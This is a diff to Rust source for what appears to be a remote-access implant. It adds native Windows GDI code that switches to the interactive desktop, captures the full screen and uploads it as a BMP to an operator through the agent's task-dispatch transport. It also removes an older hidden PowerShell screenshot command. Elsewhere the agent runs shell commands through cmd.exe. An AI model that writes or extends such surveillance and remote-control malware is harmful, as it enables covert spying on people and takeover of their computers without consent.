@@ -31,6 +31,83 @@ fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
     DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
 }
 
+fn do_screenshot_native() -> Result<Vec<u8>, String> {
+    use windows_sys::Win32::Graphics::Gdi::*;
+    use windows_sys::Win32::System::StationsAndDesktops::*;
+    use windows_sys::Win32::System::Threading::GetCurrentThreadId;
+    use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
+    use windows_sys::Win32::Foundation::FALSE;
+
+    // Raw access mask constants (not all are defined in windows-sys 0.52)
+    const WINSTA_ALL: u32 = 0x037F;
+    const READ_CTL: u32   = 0x00020000;
+    const DESK_ALL: u32   = 0x01FF | READ_CTL;
+
+    unsafe {
+        let h_orig_sta = GetProcessWindowStation();
+        let h_sta = OpenWindowStationA(c"WinSta0".as_ptr() as _, FALSE, WINSTA_ALL | READ_CTL);
+        if h_sta != 0 { SetProcessWindowStation(h_sta); }
+        let h_orig_desk = GetThreadDesktop(GetCurrentThreadId());
+        let h_desk = OpenDesktopA(c"Default".as_ptr() as _, 0, FALSE, DESK_ALL);
+        if h_desk != 0 { SetThreadDesktop(h_desk); }
+
+        let h_dc = GetDC(0);
+        let sw = GetSystemMetrics(SM_CXSCREEN);
+        let sh = GetSystemMetrics(SM_CYSCREEN);
+        let h_mem_dc = CreateCompatibleDC(h_dc);
+        let h_bmp = CreateCompatibleBitmap(h_dc, sw, sh);
+        let h_old = SelectObject(h_mem_dc, h_bmp as _);
+        BitBlt(h_mem_dc, 0, 0, sw, sh, h_dc, 0, 0, SRCCOPY);
+        SelectObject(h_mem_dc, h_old);
+
+        let row_bytes = (sw as usize * 3 + 3) & !3;
+        let pix_bytes = row_bytes * sh as usize;
+        let mut pix_data: Vec<u8> = vec![0u8; pix_bytes];
+
+        let mut bmi = BITMAPINFO {
+            bmiHeader: BITMAPINFOHEADER {
+                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
+                biWidth: sw,
+                biHeight: sh,
+                biPlanes: 1,
+                biBitCount: 24,
+                biCompression: BI_RGB,
+                biSizeImage: 0,
+                biXPelsPerMeter: 0,
+                biYPelsPerMeter: 0,
+                biClrUsed: 0,
+                biClrImportant: 0,
+            },
+            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }],
+        };
+        GetDIBits(h_dc, h_bmp, 0, sh as u32, pix_data.as_mut_ptr() as _, &mut bmi, DIB_RGB_COLORS);
+
+        DeleteObject(h_bmp as _);
+        DeleteDC(h_mem_dc);
+        ReleaseDC(0, h_dc);
+
+        if h_desk != 0 { SetThreadDesktop(h_orig_desk); CloseDesktop(h_desk); }
+        if h_sta != 0  { SetProcessWindowStation(h_orig_sta); CloseWindowStation(h_sta); }
+
+        if pix_bytes == 0 { return Err("capture failed".into()); }
+
+        let hdr_size = 14usize + std::mem::size_of::<BITMAPINFOHEADER>();
+        let file_size = hdr_size + pix_bytes;
+        let mut bmp = Vec::<u8>::with_capacity(file_size);
+        bmp.extend_from_slice(b"BM");
+        bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
+        bmp.extend_from_slice(&0u32.to_le_bytes());
+        bmp.extend_from_slice(&(hdr_size as u32).to_le_bytes());
+        let hdr_bytes = std::slice::from_raw_parts(
+            &bmi.bmiHeader as *const BITMAPINFOHEADER as *const u8,
+            std::mem::size_of::<BITMAPINFOHEADER>(),
+        );
+        bmp.extend_from_slice(hdr_bytes);
+        bmp.extend_from_slice(&pix_data);
+        Ok(bmp)
+    }
+}
+
 fn shell(cmd: &str) -> String {
     match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
         Ok(o) => {
@@ -451,24 +528,11 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &out, "");
         }
         "SCREENSHOT" => {
-            let sc_ps = concat!(
-                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
-                "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,",
-                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
-                "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
-                "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
-                "$ms=[System.IO.MemoryStream]::new();$bmp.Save($ms,'Png');",
-                "[Convert]::ToBase64String($ms.ToArray())"
-            );
-            match Command::new("powershell.exe").args(["-NoP","-NonI","-W","Hidden","-C",sc_ps]).output() {
-                Ok(o) if o.status.success() => {
-                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
-                    if let Ok(png) = STANDARD.decode(&b64) {
-                        t.upload_file(task.id, "screenshot.png", &png);
-                        t.send_result(task.id, "[+] screenshot uploaded", "");
-                    } else { t.send_result(task.id, "", "base64 decode failed"); }
+            match do_screenshot_native() {
+                Ok(bmp) => {
+                    t.upload_file(task.id, "screenshot.bmp", &bmp);
+                    t.send_result(task.id, &format!("[+] screenshot captured ({} bytes)", bmp.len()), "");
                 }
-                Ok(o) => t.send_result(task.id, "", &String::from_utf8_lossy(&o.stderr)),
                 Err(e) => t.send_result(task.id, "", &format!("screenshot: {}", e)),
             }
         }
